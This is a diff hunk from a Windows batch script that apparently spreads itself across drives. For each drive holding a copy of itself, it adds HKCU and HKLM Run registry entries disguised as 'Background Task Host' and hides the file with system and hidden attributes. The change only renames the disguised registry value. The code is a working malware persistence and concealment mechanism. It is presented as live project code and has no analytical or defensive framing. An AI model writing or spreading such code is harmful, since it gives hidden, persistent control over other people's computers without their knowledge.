@@ -88,8 +88,8 @@ attrib +s +h "%path_autoRun2%\%~nx0"
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
   if exist "%%i:\" (
     if exist "%%i:\%~nx0" (
-      reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host - %%i" /d "%%i:\%~nx0" /f
-      reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host - %%i" /d "%%i:\%~nx0" /f
+      reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host %%i" /d "%%i:\%~nx0" /f
+      reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host %%i" /d "%%i:\%~nx0" /f
       attrib +s +h "%%i:\%~nx0"
 
       if "%%i:" NEQ "%systemDrive%" if "%%i:" NEQ "D:" (
